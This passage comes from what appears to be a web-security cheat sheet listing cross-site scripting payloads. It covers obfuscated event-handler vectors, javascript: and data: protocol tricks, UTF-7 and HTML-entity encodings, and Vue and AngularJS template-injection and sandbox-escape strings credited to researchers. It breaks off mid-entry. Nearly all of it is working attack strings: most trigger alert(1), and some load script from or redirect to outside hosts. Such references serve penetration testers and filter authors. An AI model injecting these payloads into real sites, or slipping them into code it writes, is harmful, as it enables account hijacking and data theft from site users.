`<xss tabindex=1 autofocus onfocus="throw defaultView.onerror=&#97lert,1">`
<xss> with onerror+onfocus using throw defaultView.onerror=alert + defaultView\[\] access + quoted handler value (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus="throw defaultView.onerror=defaultView[title+id],1">`
<xss> with onerror+onfocus using throw defaultView.onerror=alert + &Tab; as space + defaultView\[\] access (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus=throw&Tab;defaultView.onerror=defaultView[title+id],1>`
<xss> with onerror+onfocus using throw defaultView.onerror=alert + &#32 as space + defaultView\[\] access (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32defaultView.onerror=defaultView[title+id],1>`
<xss> with onerror+onfocus using throw self.onerror=alert + &#32 as space + self\[\] access (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32self.onerror=self[title+id],1>`
<xss> with onerror+onfocus using throw globalThis.onerror=alert + &#32 as space + globalThis\[\] access (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32globalThis.onerror=globalThis[title+id],1>`
<xss> with onerror+onfocus using throw frames.onerror=alert + &#32 as space + frames\[\] access (html)
`<xss title=aler id=t tabindex=1 autofocus onfocus=throw&#32frames.onerror=frames[title+id],1>`
<xss> with onfocus using location=title+id (&lpar; parens) (html)
`<xss title=java id=script:ale class=rt&lpar;1&rpar; tabindex=1 autofocus onfocus=location=title+id+className>`
<xss> with onfocus using location=title+id (&#40 parens) (html)
`<xss title=java id=script:ale class=rt&#40;1&#41; tabindex=1 autofocus onfocus=location=title+id+className>`
<xss> with onfocus using location=title+id (&#x28 parens) (html)
`<xss title=java id=script:ale class=rt&#x28;1&#x29; tabindex=1 autofocus onfocus=location=title+id+className>`
<xss> with onfocus using window\[\] access (html)
`<xss tabindex=1 autofocus onfocus=window['a'+'lert'](1)>`
<xss> with onfocus using template-literal \`a\` string + window\[\] access (html)
`` <xss tabindex=1 autofocus onfocus=window[`a`+'lert'](1)> ``
<xss> with onfocus using unicode escape (html)
`<xss tabindex=1 autofocus onfocus=\u0061lert(1)>`
<xss> with onfocus using ES6 unicode escape (html)
`<xss tabindex=1 autofocus onfocus=\u{0061}lert(1)>`
<xss> with onfocus using ES6 unicode escape without zero padding (html)
`<xss tabindex=1 autofocus onfocus=\u{61}lert(1)>`
<xss> with onfocus using ES6 unicode escape with zero padding (html)
`<xss tabindex=1 autofocus onfocus=\u{00000000000061}lert(1)>`
<xss> with onfocus using self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self['a'+'lert'](1)>`
<xss> with onfocus using template-literal \`a\` string + self\[\] access (html)
`` <xss tabindex=1 autofocus onfocus=self[`${`a`}lert`](1)> ``
<xss> with onfocus using \\a literal in string + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self['\a'+'lert'](1)>`
<xss> with onfocus using \\x61 escape + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self['\x61'+'lert'](1)>`
<xss> with onfocus using \\141 octal escape + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self['\141'+'lert'](1)>`
<xss> with onfocus using /a/.source + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[/a/.source+/lert/.source](1)>`
<xss> with onfocus using atob.name\[0\] + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>`
<xss> with onfocus using atob.name\[0\] + self\[\] access (html) #2
`<xss tabindex=1 autofocus onfocus=self[atob.name[0]+'lert'](1)>`
<xss> with onfocus using String.fromCharCode(0x61) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[String.fromCharCode(0x61)+'lert'](1)>`
<xss> with onfocus using String.fromCodePoint(0x61) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[String.fromCodePoint(0x61)+'lert'](1)>`
<xss> with onfocus using 10..toString(17) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[10..toString(17)+'lert'](1)>`
<xss> with onfocus using 10n.toString(17) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[10n.toString(17)+'lert'](1)>`
<xss> with onfocus using 0xa.toString(17) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[0xa.toString(17)+'lert'](1)>`
<xss> with onfocus using 0b1010.toString(17) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[0b1010.toString(17)+'lert'](1)>`
<xss> with onfocus using 0o12.toString(17) + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[0o12.toString(17)+'lert'](1)>`
<xss> with onfocus using atob('YQ==') + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[atob('YQ==')+'lert'](1)>`
<xss> with onfocus using unescape('%61') + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[unescape('%61')+'lert'](1)>`
<xss> with onfocus using decodeURI('%61') + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[decodeURI('%61')+'lert'](1)>`
<xss> with onfocus using decodeURIComponent('%61') + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self[decodeURIComponent('%61')+'lert'](1)>`
<xss> with onfocus using +\[\] coercion + self\[\] access (html)
`<xss tabindex=1 autofocus onfocus=self['a'+[]+'lert'](1)>`
<xss> with onfocus using frames\[\] access (html)
`<xss tabindex=1 autofocus onfocus=frames['a'+'lert'](1)>`
<xss> with onfocus using 10n.toString(17) + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[10n.toString(17)+'lert'](1)>`
<xss> with onfocus using 0xa.toString(17) + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[0xa.toString(17)+'lert'](1)>`
<xss> with onfocus using 0b1010.toString(17) + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[0b1010.toString(17)+'lert'](1)>`
<xss> with onfocus using 0o12.toString(17) + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[0o12.toString(17)+'lert'](1)>`
<xss> with onfocus using atob('YQ==') + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[atob('YQ==')+'lert'](1)>`
<xss> with onfocus using unescape('%61') + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[unescape('%61')+'lert'](1)>`
<xss> with onfocus using decodeURI('%61') + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[decodeURI('%61')+'lert'](1)>`
<xss> with onfocus using decodeURIComponent('%61') + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView[decodeURIComponent('%61')+'lert'](1)>`
<xss> with onfocus using +\[\] coercion + defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView['a'+[]+'lert'](1)>`
<xss> with onfocus using defaultView\[\] access (html)
`<xss tabindex=1 autofocus onfocus=defaultView['a'+'lert'](1)>`
No parentheses using the function constructor in Error.prepareStackTrace
`<script>Object.prototype.message='alert\x281337\x29';Array.prototype.toString=Error.prototype.toString;Error.prepareStackTrace = Function;const x = new Error;x.valueOf=x.stack;+x;</script>`
## Frameworks
Bootstrap onanimationstart event
`<xss class=progress-bar-animated onanimationstart=alert(1)>`
Bootstrap ontransitionend event
`<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>`
## Protocols
Iframe src attribute JavaScript protocol
`<iframe src="javascript:alert(1)">`
A standard JavaScript protocol
`<a href="javascript:alert(1)">XSS</a>`
The protocol is not case sensitive
`<a href="JaVaScript:alert(1)">XSS</a>`
Characters \\x01-\\x20 are allowed before the protocol
`<a href=" 	javascript:alert(1)">XSS</a>`
Characters \\x09,\\x0a,\\x0d are allowed inside the protocol
`<a href="javas	cript:alert(1)">XSS</a>`
Characters \\x09,\\x0a,\\x0d are allowed after protocol name before the colon
`<a href="javascript\
:alert(1)">XSS</a>`
Xlink namespace inside SVG with JavaScript protocol
`<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>`
SVG animate tag using values
`<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>`
SVG animate tag using to
`<svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a>`
SVG set tag
`<svg><set xlink:href=#x attributeName=href to=javascript:alert(1) /><a id=x><text x=20 y=20>XSS</text></a>`
Data protocol inside script src
`<script src="data:text/javascript,alert(1)"></script>`
SVG script href attribute without closing script tag
`<svg><script href="data:text/javascript,alert(1)" />`
Import statement with data URL
`<script>import('data:text/javascript,alert(1)')</script>`
MathML makes any tag clickable
`<math><x href="javascript:alert(1)">blah`
Button and formaction
`<form><button formaction=javascript:alert(1)>XSS`
Input and formaction
`<form><input type=submit formaction=javascript:alert(1) value=XSS>`
Form and action
`<form action=javascript:alert(1)><input type=submit value=XSS>`
Animate tag with keytimes and multiple values
`<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a>`
Embed supports code attribute
`<embed code=https://portswigger-labs.net width=500 height=500 type=text/html>`
Object tag supports param url
`<object width=500 height=500 type=text/html><param name=url value=https://portswigger-labs.net>`
Object tag supports param code
`<object width=500 height=500 type=text/html><param name=code value=https://portswigger-labs.net>`
Object tag supports param movie
`<object width=500 height=500 type=text/html><param name=movie value=https://portswigger-labs.net>`
Object tag supports param src
`<object width=500 height=500 type=text/html><param name=src value=https://portswigger-labs.net>`
## Other useful attributes
Using srcdoc attribute
`<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>`
Using srcdoc with entities
`<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>`
Click a submit element from anywhere on the page, even outside the form
`<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>`
Hidden inputs: Access key attributes can enable XSS on normally unexploitable elements
`<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)`
Link elements: Access key attributes can enable XSS on normally unexploitable elements
`<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)`
Download attribute can save a copy of the current webpage
`<a href=# download="filename.html">Test</a>`
Disable referrer using referrerpolicy
`<img referrerpolicy="no-referrer" src="//portswigger-labs.net">`
Set window.name via parameter on the window.open function
`<a href=# onclick="window.open('http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//','alert(1)')">XSS</a>`
Set window.name via name attribute in a <iframe> tag
`<iframe name="alert(1)" src="https://portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></iframe>`
Set window.name via target attribute in a <base> tag
`<base target="alert(1)"><a href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in base tag</a>`
Set window.name via target attribute in a <a> tag
`<a target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//">XSS via target in a tag</a>`
Set window.name via usemap attribute in a <img> tag
`<img src="validimage.png" width="10" height="10" usemap="#xss"><map name="xss"><area shape="rect" coords="0,0,82,126" target="alert(1)" href="http://subdomain1.portswigger-labs.net/xss/xss.php?context=js_string_single&x=%27;eval(name)//"></map>`
Set window.name via target attribute in a <form> tag
`<form action="http://subdomain1.portswigger-labs.net/xss/xss.php" target="alert(1)"><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" value="XSS via target in a form"></form>`
Set window.name via formtarget attribute in a <input> tag type submit
`<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input type="submit" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type submit"></form>`
Set window.name via formtarget attribute in a <input> tag type image
`<form><input type=hidden name=x value="';eval(name)//"><input type=hidden name=context value=js_string_single><input name=1 type="image" src="validimage.png" formaction="http://subdomain1.portswigger-labs.net/xss/xss.php" formtarget="alert(1)" value="XSS via formtarget in input type image"></form>`
## Special tags
Redirect to a different domain
`<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">`
Meta charset attribute UTF-7
`<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-`
Meta charset UTF-7
`<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-`
UTF-7 BOM characters (Has to be at the start of the document) 1
`+/v8\
+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
UTF-7 BOM characters (Has to be at the start of the document) 2
`+/v9\
+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
UTF-7 BOM characters (Has to be at the start of the document) 3
`+/v+\
+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
UTF-7 BOM characters (Has to be at the start of the document) 4
`+/v/\
+ADw-script+AD4-alert(1)+ADw-/script+AD4-`
Upgrade insecure requests
`<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">`
Disable JavaScript via iframe sandbox
`<iframe sandbox src="//portswigger-labs.net"></iframe>`
Disable referer
`<meta name="referrer" content="no-referrer">`
## Encoding
Overlong UTF-8
`%C0%BCscript>alert(1)</script>\
%E0%80%BCscript>alert(1)</script>\
%F0%80%80%BCscript>alert(1)</script>\
%F8%80%80%80%BCscript>alert(1)</script>\
%FC%80%80%80%80%BCscript>alert(1)</script>`
Unicode escapes
`<script>\u0061lert(1)</script>`
Unicode escapes ES6 style
`<script>\u{61}lert(1)</script>`
Unicode escapes ES6 style zero padded
`<script>\u{0000000061}lert(1)</script>`
Hex encoding JavaScript escapes
`<script>eval('\x61lert(1)')</script>`
Octal encoding
`<script>eval('\141lert(1)')</script>\
<script>eval('alert(\061)')</script>\
<script>eval('alert(\61)')</script>`
Decimal encoding with optional semi-colon
`<a href="&#106;avascript:alert(1)">XSS</a><a href="&#106avascript:alert(1)">XSS</a>`
SVG script with HTML encoding
`<svg><script>&#97;lert(1)</script></svg>\
<svg><script>&#x61;lert(1)</script></svg>\
<svg><script>alert&NewLine;(1)</script></svg>\
<svg><script>x="&quot;,alert(1)//";</script></svg>`
Decimal encoding with padded zeros
`<a href="&#0000106avascript:alert(1)">XSS</a>`
Hex encoding entities
`<a href="&#x6a;avascript:alert(1)">XSS</a>`
Hex encoding without semi-colon provided next character is not a-f0-9
`<a href="j&#x61vascript:alert(1)">XSS</a>\
<a href="&#x6a\
avascript:alert(1)">XSS</a>\
<a href="&#x6a avascript:alert(1)">XSS</a>`
Hex encoding with padded zeros
`<a href="&#x0000006a;avascript:alert(1)">XSS</a>`
Hex encoding is not case sensitive
`<a href="&#X6A;avascript:alert(1)">XSS</a>`
HTML entities
`<a href="javascript&colon;alert(1)">XSS</a>\
<a href="java&Tab;script:alert(1)">XSS</a>\
<a href="java&NewLine;script:alert(1)">XSS</a>\
<a href="javascript&colon;alert&lpar;1&rpar;">XSS</a>`
URL encoding
`<a href="javascript:x='%27-alert(1)-%27';">XSS</a>`
HTML entities and URL encoding
`<a href="javascript:x='&percnt;27-alert(1)-%27';">XSS</a>`
## Obfuscation
Data protocol inside script src with base64
`<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>`
Data protocol inside script src with base64 and HTML entities
`<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>`
Data protocol inside script src with base64 and URL encoding
`<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>`
Iframe srcdoc HTML encoded
`<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>`
Iframe JavaScript URL with HTML and URL encoding
`<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>`
SVG script with unicode escapes and HTML encoding
`<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>`
Img tag with base64 encoding
`` <img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`> ``
## Client-side template injection
### VueJS reflected
Version:
Author:
Length:
Vector:
Version 2
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
41
`{{constructor.constructor('alert(1)')()}}`
Version 2
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53) & [Sebastian Lekies](https://twitter.com/slekies) (Google) & [Eduardo Vela Nava](https://twitter.com/sirdarckcat) (Google) & [Krzysztof Kotowicz](https://twitter.com/kkotowicz) (Google)
62
`<div v-html="''.constructor.constructor('alert(1)')()">a</div>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
39
`<x v-html=_c.constructor('alert(1)')()>`
Version 2
[Peter af Geijerstam](https://twitter.com/p4fg) (Swedish Shellcode Factory)
37
`<x v-if=_c.constructor('alert(1)')()>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
32
`{{_c.constructor('alert(1)')()}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
32
`{{_v.constructor('alert(1)')()}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
32
`{{_s.constructor('alert(1)')()}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
39
`` <p v-show="_c.constructor`alert(1)`()"> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
52
`` <x v-on:click='_b.constructor`alert(1)`()'>click</x> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
41
`` <x v-bind:a='_b.constructor`alert(1)`()'> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x @[_b.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x :[_b.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <p v-=_c.constructor`alert(1)`()> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x #[_c.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
32
`` <p :=_c.constructor`alert(1)`()> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
32
`{{_c.constructor('alert(1)')()}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
30
`` {{_b.constructor`alert(1)`()}} ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
40
`<x v-bind:is="'script'" src="//14.rs" />`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
27
`<x is=script src=//⑭.₨>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
48
`` <x @click='_b.constructor`alert(1)`()'>click</x> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x @[_b.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x :[_b.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` <x #[_c.constructor`alert(1)`()]> ``
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
52
`<x title"="&lt;iframe&Tab;onload&Tab;=alert(1)&gt;">`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
73
`<x title"="&lt;iframe&Tab;onload&Tab;=setTimeout(/alert(1)/.source)&gt;">`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
31
`<xyz<img/src onerror=alert(1)>>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
116
`<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
59
`<a @['c\lic\u{6b}']="_c.constructor('alert(1)')()">test</a>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
42
`{{$el.ownerDocument.defaultView.alert(1)}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
56
`{{$el.innerHTML='\u003cimg src onerror=alert(1)\u003e'}}`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
45
`<img src @error=e=$event.path.pop().alert(1)>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
55
`<img src @error=e=$event.composedPath().pop().alert(1)>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
30
`<img src @error=this.alert(1)>`
Version 2
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
24
`<svg@load=this.alert(1)>`
Version 2
[Davit Karapetyan](https://twitter.com/davwwwx) (Independent consultant)
72
`<p slot-scope="){}}])+this.constructor.constructor('alert(1)')()})};//">`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
40
`{{_openBlock.constructor('alert(1)')()}}`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
42
`{{_createBlock.constructor('alert(1)')()}}`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
46
`{{_toDisplayString.constructor('alert(1)')()}}`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
42
`{{_createVNode.constructor('alert(1)')()}}`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
47
`` <p v-show=_createBlock.constructor`alert(1)`()> ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
41
`` <x @[_openBlock.constructor`alert(1)`()]> ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
42
`` <x @[_capitalize.constructor`alert(1)`()]> ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
52
`` <x @click=_withCtx.constructor`alert(1)`()>click</x> ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
40
`<x @click=$event.view.alert(1)>click</x>`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
34
`` {{_Vue.h.constructor`alert(1)`()}} ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
33
`` {{$emit.constructor`alert(1)`()}} ``
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
85
`<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
85
`<teleport to=script:nth-child(2)>alert&lpar;1&rpar;</teleport></div><script></script>`
Version 3
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) & [PwnFunction](https://twitter.com/PwnFunction) (Independent consultant)
35
`<component is=script text=alert(1)>`
### AngularJS sandbox escapes reflected
Version:
Author:
Length:
Vector:
1.0.1 - 1.1.5
[Mario Heiderich](https://twitter.com/cure53berlin) (Cure53)
41
`{{constructor.constructor('alert(1)')()}}`
1.0.1 - 1.1.5 (shorter)
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger) & [Lewis Ardern](https://twitter.com/LewisArdern) (Synopsys)
33
`{{$on.constructor('alert(1)')()}}`
1.2.0 - 1.2.1
[Jann Horn](https://twitter.com/tehjh) (Google)
122
`{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}`
1.2.2 - 1.2.5
[Gareth Heyes](https://twitter.com/garethheyes) (PortSwigger)
23
`{{{}.")));alert(1)//"}}`
1.2.6 - 1.2.18
[Jan Horn](https://twitter.com/tehjh) (Google)
106
